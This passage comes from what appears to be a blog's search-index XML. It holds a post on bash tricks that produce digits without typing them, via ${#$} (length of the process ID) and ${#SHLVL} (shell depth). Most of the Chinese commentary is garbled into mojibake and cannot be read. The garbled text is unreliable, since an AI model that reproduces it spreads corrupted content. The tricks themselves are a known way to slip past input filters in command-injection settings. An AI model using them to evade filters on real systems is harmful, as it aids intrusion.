class="line">å¯ä»¥ç”Ÿæˆéšæœºæ•°ã€‚å¯ä»¥é…åˆ#æ„é€ 6543è¿™å‡ ç§æ•°å­—ã€‚æ¦‚ç‡æ¯”è¾ƒå¤§ã€‚è¿˜å¯ä»¥é…åˆæˆªå–ã€‚è·å¾—æ•°å­—</span><br><span class="line">echo $&#123;#$&#125;</span><br><span class="line">$$æ˜¯ç¨‹åºPIDã€‚#è·å–é•¿åº¦ã€‚çœ‹è¿æ°”å’¯</span><br><span class="line">echo $&#123;#SHLVL&#125;</span><br><span class="line">SHLVLè²Œä¼¼æ˜¯ä¸€ä¸ªshellç»ˆç«¯æ·±åº¦ã€‚ã€‚ç„¶å#å¯ä»¥è·å–æ•°å­—1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
